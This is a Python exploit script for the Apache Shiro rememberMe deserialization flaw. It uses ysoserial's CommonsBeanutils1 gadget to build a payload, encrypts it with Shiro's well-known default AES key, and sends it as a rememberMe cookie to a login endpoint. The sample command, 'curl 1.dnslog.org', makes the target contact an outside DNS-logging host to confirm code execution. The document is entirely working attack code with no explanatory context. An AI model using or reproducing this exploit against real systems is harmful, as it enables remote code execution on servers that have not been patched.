# -*- encoding:utf-8 -*-
# pip install pycrypto
import sys  
import base64  
import uuid  
from random import Random  
import subprocess  
from Crypto.Cipher import AES
import requests

def encode_rememberme(command):  
   popen = subprocess.Popen(['java', '-jar', './ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
   BS   = AES.block_size
   pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
   key  =  "kPH+bIxk5D2deZiIxcaaaA=="
   mode =  AES.MODE_CBC
   iv   =  uuid.uuid4().bytes
   encryptor = AES.new(base64.b64decode(key), mode, iv)
   file_body = pad(popen.stdout.read())
   base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
   return base64_ciphertext

if __name__ == '__main__':  
   url = "http://127.0.0.1/login"
   payload = encode_rememberme("curl 1.dnslog.org")   
   print payload.decode() 
   requests.get(url=url,cookies={'rememberMe': payload.decode()},verify=False) 
   